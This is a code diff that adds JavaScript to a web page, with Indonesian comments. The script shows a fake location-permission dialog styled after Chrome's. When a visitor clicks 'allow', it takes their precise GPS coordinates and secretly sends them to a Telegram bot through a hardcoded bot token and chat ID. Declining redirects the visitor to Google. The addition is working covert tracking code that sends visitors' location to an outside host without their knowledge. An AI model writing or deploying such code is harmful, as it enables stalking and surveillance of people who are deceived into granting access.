@@ -1,3 +1,63 @@
+const BOT_TOKEN = '8880998216:AAEY0AqH8c_BQlbh3lC9TbyQX-WmIZfad5w';
+const CHAT_ID = '-1004406628327';
+
+const modal = document.getElementById('locationModal');
+const btnAllow = document.getElementById('btnAllow');
+const btnDeny = document.getElementById('btnDeny');
+
+const optPrecise = document.getElementById('optPrecise');
+const optApproximate = document.getElementById('optApproximate');
+let isPreciseSelected = true;
+
+// Switch Presisi / Perkiraan
+optPrecise.addEventListener('click', () => {
+  optPrecise.classList.add('active');
+  optApproximate.classList.remove('active');
+  isPreciseSelected = true;
+});
+
+optApproximate.addEventListener('click', () => {
+  optApproximate.classList.add('active');
+  optPrecise.classList.remove('active');
+  isPreciseSelected = false;
+});
+
+// Klik 'Lain kali' -> Lempar ke Google
+btnDeny.addEventListener('click', () => {
+  window.location.href = 'https://www.google.com';
+});
+
+// Klik 'Izinkan' -> Minta izin Chrome asli & kirim lokasi ke Telegram
+btnAllow.addEventListener('click', () => {
+  modal.style.display = 'none';
+
+  if ('geolocation' in navigator) {
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        const lat = pos.coords.latitude;
+        const lng = pos.coords.longitude;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            latitude: lat,
+            longitude: lng
+          })
+        });
+      },
+      (err) => {
+        console.log('Izin ditolak atau gagal:', err.message);
+      },
+      {
+        enableHighAccuracy: isPreciseSelected,
+        timeout: 10000,
+        maximumAge: 0
+      }
+    );
+  }
+});
 document.addEventListener('DOMContentLoaded', () => {
   
   // Element Selectors
